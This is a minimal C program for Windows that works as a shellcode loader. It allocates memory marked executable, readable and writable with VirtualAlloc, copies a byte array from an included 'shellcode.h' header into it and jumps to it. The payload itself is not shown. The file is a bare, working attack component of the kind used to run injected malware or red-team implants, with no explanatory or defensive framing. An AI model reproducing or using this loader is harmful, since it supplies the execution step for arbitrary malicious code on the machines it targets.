#include <windows.h>
#include "shellcode.h"

int main(int argc, char const *argv[])
{
	char* BUFFER = (char*)VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(BUFFER, shellcode, sizeof(shellcode));
	(*(void(*)())BUFFER)();
	return 0;
}
